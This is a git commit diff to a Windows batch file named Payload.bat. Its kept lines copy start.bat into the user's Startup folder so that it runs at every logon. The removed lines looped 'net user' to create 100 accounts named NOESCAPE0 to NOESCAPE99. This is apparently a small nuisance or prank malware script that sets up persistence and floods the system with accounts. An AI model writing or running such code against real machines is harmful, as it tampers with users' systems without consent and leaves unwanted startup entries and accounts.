0fad53cd40a52247fb3046d5d8754702a100a6f7
DanielNov2014 <michaelvinthermoller@gmail.com>
2025-04-17 21:55:13 +0200

    Update Payload.bat

--- Payload.bat
+++ Payload.bat
@@ -1,20 +1,3 @@
 @echo off
 copy "./start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-Set /a loop = 0
-
-:loopstart
-ping 127.0.0.1 -n 1 -w 50 >nul
-net user NOESCAPE%loop% /add
-
-ping 127.0.0.1 -n 1 -w 50 >nul
-goto check
-
-:check
-if %loop% == 100 goto done
-echo %loop%
-Set /a loop += 1
-goto loopstart
-
-:done
-exit
